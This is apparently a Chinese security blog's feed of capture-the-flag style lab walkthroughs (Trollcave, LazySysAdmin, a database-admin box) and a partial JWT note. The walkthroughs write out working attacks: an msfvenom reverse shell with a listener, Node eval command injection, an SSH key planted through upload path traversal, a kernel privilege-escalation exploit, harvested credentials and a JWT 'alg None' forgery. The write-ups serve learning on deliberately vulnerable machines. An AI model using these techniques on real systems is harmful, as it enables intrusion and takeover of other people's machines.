http://192.168.204.141/tools (CODE:200|SIZE:8355)                             ==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   + http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>访问dbadmin</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p><p>点击进入test_db.php</p><p>试试弱口令：admin登陆成功</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>这个地方给人的感觉就像是可以管理数据库一样所以说应该可以上传一个东西到数据库什么的，而且就这个页面而言，创建一个新的数据库是没有问题的</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="1-创建新的数据库和表格"><a href="#1-创建新的数据库和表格" class="headerlink" title="1.创建新的数据库和表格"></a>1.创建新的数据库和表格</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p><p>选择数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p><p>创建表格：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p><h3 id="2-表格里储存可执行的php代码"><a href="#2-表格里储存可执行的php代码" class="headerlink" title="2.表格里储存可执行的php代码"></a>2.表格里储存可执行的php代码</h3><?php system(ls);?><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p><h3 id="3-php代码里执行远程主机命令"><a href="#3-php代码里执行远程主机命令" class="headerlink" title="3.php代码里执行远程主机命令"></a>3.php代码里执行远程主机命令</h3><p>通过之前的文件包含漏洞来执行</p><p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trollcave渗透测试</title>
      <link href="/2020/12/28/trollcave/"/>
      <url>/2020/12/28/trollcave/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>简介：一个社区论坛网站</p><p><em>“God himself cannot hack this website.” – dragon, site admin</em></p><p>很牛逼的介绍啊！！</p><h1 id="Trollcave渗透测试案例："><a href="#Trollcave渗透测试案例：" class="headerlink" title="Trollcave渗透测试案例："></a>Trollcave渗透测试案例：</h1><h2 id="1-了解其功能"><a href="#1-了解其功能" class="headerlink" title="1.了解其功能"></a>1.了解其功能</h2><p>主要功能：欢迎导语页面，密码重置，法律宗教</p><h2 id="2-发现服务（nmap）"><a href="#2-发现服务（nmap）" class="headerlink" title="2.发现服务（nmap）"></a>2.发现服务（nmap）</h2><h3 id="1-发现主机IP"><a href="#1-发现主机IP" class="headerlink" title="1.发现主机IP"></a>1.发现主机IP</h3><pre><code>nmap -sP</code></pre><h3 id="2-发现端口（服务）"><a href="#2-发现端口（服务）" class="headerlink" title="2.发现端口（服务）"></a>2.发现端口（服务）</h3><pre><code>nmap -sS -O（显示操作系统信息） -P0（无Ping扫描） -n（不进行dns解析） -Anmap -sS -O -P0 -n -A</code></pre><p>关于-P0：</p><p>无ping扫描可以躲避某些防火墙的防护，可以在目标主机禁止ping的情况下使用。</p><p>用-P0禁止主机发现会使Nmap对每一个指令的目标IP地址进行所要求的扫描，可以穿透防火墙，也可以避免被防火墙发现。</p><p>得到端口：</p><p>20：ssh</p><p>80：HTTP</p><h2 id="3-逻辑缺陷分析"><a href="#3-逻辑缺陷分析" class="headerlink" title="3.逻辑缺陷分析"></a>3.逻辑缺陷分析</h2><h3 id="1-分析网站的功能"><a href="#1-分析网站的功能" class="headerlink" title="1.分析网站的功能"></a>1.分析网站的功能</h3><p>1.注册不可用</p><p>2.网站用户的权限：</p><p>King：superadmin</p><p>coderguy：admin</p><p>3.修改（重置）密码的路径暴露了：</p><p>password_resets</p><pre><code>所以我最近收到了很多用户的电子邮件，他们忘记了密码，需要重新设置。因为这个网站没有“忘记密码”按钮，我不得不手动重置。我真的厌倦了，所以是时候实施密码重置了。目前正忙于此事，但网站电子邮件有问题。您可能已经注意到，由于这个原因，新用户的激活已被关闭。到目前为止，我已经在rails中实现了一个password_resets资源（implemented a password_resets resource in rails），除了电子邮件之外，它的工作效率大约是90%。非常令人沮丧。如果有人对如何让电子邮件正常工作有任何建议，请给我发一封</code></pre><p>这里也就是说已经通过发送邮件的方式来进行修改密码</p><p>而且是基于rail来实现的</p><h3 id="2-从功能上分析逻辑漏洞"><a href="#2-从功能上分析逻辑漏洞" class="headerlink" title="2.从功能上分析逻辑漏洞"></a>2.从功能上分析逻辑漏洞</h3><p>1.重置密码漏洞：</p><p>①漏洞发现，发现重置密码的路径</p><p>②漏洞利用，修改超级管理员的密码</p><h2 id="4-利用漏洞"><a href="#4-利用漏洞" class="headerlink" title="4.利用漏洞"></a>4.利用漏洞</h2><p>1.经过对implemented a password_resets resource in rails资料查阅(这里有两个关键词password_resets和rails，google一下，发现这么一个网站<a href="https://www.railstutorial.org/book/password_reset)：" target="_blank" rel="noopener">https://www.railstutorial.org/book/password_reset)：</a></p><p>/password_resets/new可以对member成员的密码进行修改但是对King无法进行修改</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=xer</a></p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//搜狗截图20年12月28日1441_1.png" style="zoom:80%;"><p>2.但是这里存在一个垂直越权的漏洞：</p><p><a href="http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King" target="_blank" rel="noopener">http://192.168.204.140/password_resets/edit.gYFOFjpUNzONVKNaC_xwrg?name=King</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51446_3.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51445_2.png" alt></p><p>说明已经将King的密码成功修改了</p><p>然后登陆：success！！！</p><p>3.接下来开始利用superadmin来对该网页进行学习（嘿嘿嘿）</p><p>①创建ssh公钥：</p><p>a.在攻击机利用ssh命令创建一个public key，来连接靶机上你先要连接的用户</p><p>通过信息收集：</p><p><u>嘿，伙计，如果我要在网站上做更多的工作，我真的需要sudo访问。我也不知道对我来说交互使用rails用户是一个多好的主意，也许我们应该分开，我梦寐以求的coderguy in /etc/sudoers…</u></p><p>得到用户：<strong>rails</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51557_4.png" alt></p><p>然后收集到一个路径：/home/rails/.ssh/<u>authorized_keys</u>这个地方是文件名可以自行修改</p><p>b.接下来在kali上为其创建公钥</p><pre><code>ssh-keygen -C（为所创建的公钥做注释）rails@192.168.204.140</code></pre><p>②把public key上 传到靶机上：</p><p>a.利用文件上传</p><p>b.按公钥存储的路径（默认Default）上传公钥</p><p><strong>../../../../../../home/rails/.ssh/authorized_keys</strong>（上传的名字）注意这里的名字一定要是authorized_keys</p><p>③在攻击机利用公钥去连接靶机上的用户</p><pre><code>ssh rails@192.168.204.140 -i xxx（此处的名字要与你上传的xxx.pub文件名字相同，不然会连接不上！！！！）Last login: Thu Jul 11 03:57:36 2019 from 192.168.198.136$ ifconfig  inet addr:192.168.204.140$ whoamirails$ ls /homecoderguy  dave    dragon    king  rails          </code></pre><h3 id="5-关键文件代码分析"><a href="#5-关键文件代码分析" class="headerlink" title="5.关键文件代码分析"></a>5.关键文件代码分析</h3><pre><code>$vim /home/king/calc/calc.jshttp.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;)//说明在靶机上创建了一个服务8端口8888分析route（路由）函数：##解释：根据url里面不同的地址，分别调用与之对应的函数来响应function calc(pathname, request, query, response){        sum = query.split(&#39;=&#39;)[1];        #将等号后面的值赋给sum        console.log(sum)        #其实这个方法和alert方法类似，唯一不同的是该方法是显示在控制台的，而alert()方法是显示在浏览器上的        response.writeHead(200, {&quot;Content-Type&quot;: &quot;text/plain&quot;});#向请求的客户端发送响应头。 该函数在一个请求内最多只能调用一次，如果不调用，则会自动生成一个响应头。statusCode HTTP状态码，如200(请求成功），404（未找到）等。        response.end(eval(sum).toString());        #停止处理文件的脚本代码，并且返回当前产生的内容}</code></pre><p> response.end(eval(sum).toString());</p><p>eval()执行response对象end（计算公式），之后把计算公式的结果返回到浏览器</p><p>eg：<a href="http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器" target="_blank" rel="noopener">http://192.168.204.140/?sum=1+1然后通过end来把结果2反馈给浏览器</a></p><p>eg：<a href="http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)" target="_blank" rel="noopener">http://192.168.204.140/?sum=require(&quot;child_process&quot;).exec(&quot;whoami&quot;)</a></p><p>这里会通过require（）在本地操作系统上启动一个子进程，然后通过上述子进程去执行（exec）whoami这个shell命令，然后将上述内容房子eval（）里面，结果就会在本地操作系统上真正执行whoami</p><p>踩坑：如果calc.js文件因为操作失误不小心把内容干没了，就重置虚拟机</p><h3 id="6-代码漏洞验证"><a href="#6-代码漏洞验证" class="headerlink" title="6.代码漏洞验证"></a>6.代码漏洞验证</h3><p>接下来使用虚拟机来模拟上述的在URL里面执行的操作</p><p>1.验证8888端口服务是不是启动</p><pre><code>netstat -antp列出当前主机上所有开放的端口|grep 8888只看端口8888是否启动netstat -antp | grep 8888</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51925_5.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=1+1&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51937_6.png" alt></p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;whoani&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A51941_7.png" alt></p><p>如果命令执行且没有报错，说明可能存在shell上传漏洞，也就是说，有可以利用的反弹shell</p><h3 id="7-生成并上传shell"><a href="#7-生成并上传shell" class="headerlink" title="7.生成并上传shell"></a>7.生成并上传shell</h3><p>这里不会得到命令的输出，而是返回了[object Object]，由此猜测sum参数里的whoami这个命令被执行了，因此可以利用这里触发一个shell。</p><p><strong>1.使用msfvenom创建shell：</strong></p><p>msfvenom -p linux/x64/meterpreter_reverse_tcp  → 设置payload</p><p>-f elf  →  生成格式</p><p>-o shell → 生成路径（输出文件名字）</p><p>LHOST=192.168.110.6   →    Kali地址</p><p>LPORT=6666      →    反弹端口</p><p>先启动msfconsole,之后输入如下命令：</p><pre><code>msf &gt; msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o demo -a x64 --platform linux LHOST=192.168.204.138 LPORT=6666</code></pre><p>2.利用文件漏洞上传shell</p><p>路径：/tmp/demo</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8828%E6%97%A52034_8.png" alt></p><p>可以看出上传文件成功</p><p>3.反弹shell</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload linux/x64/meterpreter_reverse_tcpmsf exploit(handler) &gt; set LHOST 192.168.110.6msf exploit(handler) &gt; set LPORT 6666msf exploit(handler) &gt; run -j</code></pre><pre><code>cd /tmp./yshell</code></pre><p>发现因为权限问题yshell无法反弹</p><p>4.编写启动shell的脚本(在tmp目录下)</p><p>因为rails用户没有上传执行shell的权限</p><pre><code>vim run.sh#!/bin/bashsudo cp /tmp/shell1 /home/king/shell1sudo chown king:king /home/king/shell1(chown： 修改所属用户与组。将shell1拥有者与群组改为king)sudo chmod a+x /home/king/shell1sudo /home/king/shell1</code></pre><p>对chmod命令的回顾：</p><p>符号类型改变文件权限方式：</p><p>还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：</p><ul><li>user：用户</li><li>group：组</li><li>others：其他</li></ul><p>那么我们就可以使用 <strong>u, g, o</strong> 来代表三种身份的权限。</p><p>此外， <strong>a</strong> 则代表 <strong>all</strong>，即全部的身份。读写的权限可以写成 <strong>r, w, x</strong>，也就是可以使用下表的方式来看：</p><table><thead><tr><th align="center">chmod</th><th>u g o a</th><th>+(加入) -(除去) =(设定)</th><th>r w x</th><th>文件或目录</th></tr></thead><tbody><tr><td align="center"></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>如果我们需要将文件权限设置为 <strong>-rwxr-xr–</strong> ，可以使用 <strong>chmod u=rwx,g=rx,o=r 文件名</strong> 来设定:</p><pre><code>#  touch test1    // 创建 test1 文件# ls -al test1    // 查看 test1 默认权限-rw-r--r-- 1 root root 0 Nov 15 10:32 test1# chmod u=rwx,g=rx,o=r  test1    // 修改 test1 权限# ls -al test1-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：</p><pre><code>#  chmod  a-x test1# ls -al test1-rw-r--r-- 1 root root 0 Nov 15 10:32 test1</code></pre><p>5.运行脚本</p><pre><code>./run.sh</code></pre><p>但是因为权限不够，脚本无法运行</p><p>因为/home/king目录下的calc</p><pre><code>curl &quot;http://127.0.0.1:8888/calc?sum=require(&#39;child_process&#39;).exec(&#39;/tmp/run.sh&#39;)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8829%E6%97%A51902_1.png" alt></p><p>然后没有反弹shell</p><p>查看了一下king目录下，并没有yshell，也就是说脚本没有运行</p><pre><code>chmod a+x run.js#赋予可执行权限</code></pre><p>然后再curl成功反弹shell</p><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8802%E6%97%A50052_1.png" alt></p><h2 id="另一种方法（针对ubantu的版本漏洞进行提权）："><a href="#另一种方法（针对ubantu的版本漏洞进行提权）：" class="headerlink" title="另一种方法（针对ubantu的版本漏洞进行提权）："></a>另一种方法（针对ubantu的版本漏洞进行提权）：</h2><h3 id="1-ssh创建好shell"><a href="#1-ssh创建好shell" class="headerlink" title="1.ssh创建好shell"></a>1.ssh创建好shell</h3><p>uname -a得：<br>Linux trollcave 4.4.0-197-generic #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p><strong>cat /proc/versio</strong>n得：</p><p>Linux version 4.4.0-197-generic (buildd@lcy01-amd64-026) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #229-Ubuntu SMP Wed Nov 25 11:05:42 UTC 2020</p><p>2.得知ubantu和linux版本信息</p><p>懂<del>~</del></p><pre><code>searchsploit 4.4.0-197</code></pre><p> Exploits: No Result<br>Shellcodes: No Result</p><p>是在下不配了</p><p>百度<a href="https://www.cnblogs.com/hookjoy/p/8616250.html" target="_blank" rel="noopener">Ubuntu16.04 本地提权漏洞复测过程</a></p><pre><code>rails@trollcave:/proc/sys/kernel$ cat unprivileged_bpf_disabled 0</code></pre><p><em><em>1，下载poc文件 upstream44.c<br>下载地址：<a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/up … mp;isappinstalled=0</a></em></em></p><p>下载物理机上传kali上面就行</p><pre><code>root@kali1:~/桌面/trollcave# gcc -o upstream upstream44.c</code></pre><p>复制，利用网站的文件上传漏洞传到/tmp/.Test-unix/666并赋予可执行命令，结果出问题了</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lazysysadmin渗透初探</title>
      <link href="/2020/12/26/idontcare/"/>
      <url>/2020/12/26/idontcare/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简单介绍：一个简单的社区宣传网站"><a href="#简单介绍：一个简单的社区宣传网站" class="headerlink" title="简单介绍：一个简单的社区宣传网站"></a>简单介绍：一个简单的社区宣传网站</h1><h2 id="IDontCare渗透测试："><a href="#IDontCare渗透测试：" class="headerlink" title="IDontCare渗透测试："></a>IDontCare渗透测试：</h2><h3 id="1-主机发现："><a href="#1-主机发现：" class="headerlink" title="1.主机发现："></a>1.主机发现：</h3><h4 id="发现主机的ip地址："><a href="#发现主机的ip地址：" class="headerlink" title="发现主机的ip地址："></a>发现主机的ip地址：</h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>-sP被发现主机所有在的网段（通过ping命令）</p><pre><code>nmap -sP 127.0.0.0/24</code></pre><p>根据mac地址00:0C:29:E3:72:75找到ip地址</p><p>192.168.204.13913</p><h3 id="2-服务发现："><a href="#2-服务发现：" class="headerlink" title="2.服务发现："></a>2.服务发现：</h3><h4 id="发现主机上的开放的端口："><a href="#发现主机上的开放的端口：" class="headerlink" title="发现主机上的开放的端口："></a>发现主机上的开放的端口：</h4><pre><code>nmap -sS（半开放式扫描，加快速度） -O(操作系统的信息) -p 1-65536 -T4但是这里我使用：nmap -sS -Pn -n -A 192.168.204.139</code></pre><p>发现端口：</p><p>22（ssh） </p><p>80（http）</p><p>3306（mysql）</p><p>139</p><p>445</p><p>6667</p><p>然后针对得到的端口进行实体化浏览</p><h3 id="3-关键目录扫描："><a href="#3-关键目录扫描：" class="headerlink" title="3.关键目录扫描："></a>3.关键目录扫描：</h3><p>1.根据dirb来对该网站进行扫描来确定他下面有哪一些子目录</p><pre><code>dirb http://192.168.204.139</code></pre><p>发现：</p><p><a href="http://192.168.204.139/phpmyadmin/" target="_blank" rel="noopener">http://192.168.204.139/phpmyadmin/</a></p><p>并没有发现东西，只是一个登陆界面</p><p><a href="http://192.168.204.139/wordpress/" target="_blank" rel="noopener">http://192.168.204.139/wordpress/</a></p><p>发现了一个名字：togie</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52215_1.png" alt></p><h3 id="4-查看是否有共享目录"><a href="#4-查看是否有共享目录" class="headerlink" title="4.查看是否有共享目录"></a>4.查看是否有共享目录</h3><p>1.通过enum4linux来枚举靶机的共享目录</p><pre><code>enum4linux 192.168.204.139</code></pre><p>会发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52244_2.png" alt></p><p>share$目录</p><p>并且发现允许使用空参进行登录</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52302_3.png" alt></p><p>3.通过mount命令请求一下共享资源（挂载）</p><pre><code>mount -t cifs -o username=&#39; &#39;,password=&#39;&#39; //192.168.204.139/share$ /mnt这里-t是以什么文件常见文件类型：mtfs（fat，ext）（非网络，基于本地，磁盘等）而cifs（common internet file system）//挂载互联网上的文件（基于网络）-o （选项）想要访问一个共享目录，就要指定该访问用户uname和upasswd以及所在网络的IP，而share$是指访问这个目录/mnt将share$的目录挂载到攻击机的该目录下</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52330_4.png" alt></p><p>挂载成功</p><p>解释：</p><p>CIFS (Common Internet FileSystem) 通用Internet文件系统。使用客户/服务器模式，CIFS是公共的或开放的SMB协议版本，CIFS面向网络连接的共享协议，对网络传输的可靠性要求高，常使用TCP/IP。</p><pre><code>mount [options] &lt;source&gt; &lt;directory&gt;</code></pre><p><strong>-t</strong> vfstype 指定文件系统的类型（通常不必指定。mount 会自动选择正确的类型。）</p><p>常用类型有：<br>光盘或光盘镜像：<strong>iso9660</strong><br>DOS fat16文件系统：<strong>msdos</strong><br>Windows 9x fat32文件系统：<strong>vfat</strong><br>Windows NT ntfs文件系统：<strong>ntfs</strong><br>Mount Windows文件网络共享：<strong>smbfs</strong><br>UNIX(LINUX) 文件网络共享：<strong>nfs</strong></p><p><strong>-o</strong> options 主要用来描述设备或档案的挂接方式。常用的参数有：<br><strong>loop</strong>：用来把一个文件当成硬盘分区挂接上系统<br><strong>ro</strong>：采用只读方式挂接设备<br><strong>rw</strong>：采用读写方式挂接设备<br><strong>iocharset</strong>：指定访问文件系统所用字符集<br><strong>device</strong> 要挂接(mount)的设备。<br><strong>dir</strong>设备在系统上的挂接点(mount point)。</p><h3 id="5-文件分析-ssh登录"><a href="#5-文件分析-ssh登录" class="headerlink" title="5.文件分析-ssh登录"></a>5.文件分析-ssh登录</h3><p>这里查找deetstxt文件发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52335_5.png" alt></p><p>得到一个密码12345</p><p>根据上面的wordpress文件发现togie文件发现的用户名</p><p>所以可以尝试ssh连接togie用户</p><pre><code>ssh togie@192.168.204.139</code></pre><p>然后发现登陆成功！</p><p>获取shell！</p><h3 id="6-文件分析-phpmyadmin登录"><a href="#6-文件分析-phpmyadmin登录" class="headerlink" title="6.文件分析-phpmyadmin登录"></a>6.文件分析-phpmyadmin登录</h3><p>### </p><pre><code>root@kali1:~# cd /mntroot@kali1:/mnt# cd wordpress/root@kali1:/mnt/wordpress# lsindex.php        wp-blog-header.php    wp-cron.php        wp-mail.phplicense.txt      wp-comments-post.php  wp-includes        wp-settings.phpreadme.html      wp-config.php         wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.phpwp-admin         wp-content            wp-login.php       xmlrpc.phproot@kali1:/mnt/wordpress# vim wp-cwp-comments-post.php  wp-config-sample.php  wp-cron.phpwp-config.php         wp-content/           root@kali1:/mnt/wordpress# vim wp-config.php</code></pre><p>发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8826%E6%97%A52348_6.png" alt></p><p>数据库的登陆名字</p><p>Admin</p><p>和密码</p><p>TogieMYSQL12345^^</p><p>然后进入/phpmyadmin利用上述信息进行登陆</p><p>但是却对权限进行了限制！啥也不好使。。</p><h3 id="7-终极目标：系统提权"><a href="#7-终极目标：系统提权" class="headerlink" title="7.终极目标：系统提权"></a>7.终极目标：系统提权</h3><pre><code>togie@LazySysAdmin:~$ sudo su[sudo] password for togie: root@LazySysAdmin:/home/togie# whoamiroot</code></pre><h3 id="8-最后推一下一个大佬的扫除时刻：（此处并未实操）"><a href="#8-最后推一下一个大佬的扫除时刻：（此处并未实操）" class="headerlink" title="8.最后推一下一个大佬的扫除时刻：（此处并未实操）"></a>8.最后推一下一个大佬的扫除时刻：（此处并未实操）</h3><p>URL=<a href="https://blog.csdn.net/qq_38684504/article/details/89703963" target="_blank" rel="noopener">https://blog.csdn.net/qq_38684504/article/details/89703963</a></p><p>然后根据大佬的wp安排自己一个火狐插件</p><p>wappalyzer</p><p>外加另一个很嗨的wp：</p><p><a href="https://blog.csdn.net/weixin_45557138/article/details/108548437" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45557138/article/details/108548437</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT验证</title>
      <link href="/2020/12/26/jsonweb-token-yan-zheng/"/>
      <url>/2020/12/26/jsonweb-token-yan-zheng/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><p>本节课中详细介绍了JSON Web Token（JWT）中的漏洞的利用。在这个程序中，JWT用于认证，登录成功后，用户将获得一个Cookie的JWT。</p><p>JSON Web Token是一种数据的存储机制，主要有加密和签名的安全机制。</p><p>JWT的格式如下：</p><p>Base64(header).Base64(payload).Base64(signature)</p><p>例如：</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImFhYWEiLCJpYXQiOiIxNTI1MzQyMDM3In0</p><p>表示</p><p>{“alg”:”HS256”,”typ”:”JWS”}. {“login”:”aaaa”,”iat”:”1525342037”}.网站对数据设计签名机制</p><p>第三部分是一个签名，网上说的很详细了，此处不进行说明。</p><p>具体操作就是：</p><p>然后将编码格式HS256改为None，将用户名改为admin，然后分别进行Base64编码，并把第三部分去掉（注意不要去掉.）</p><p>{“alg”:”None”,”typ”:”JWS”}. 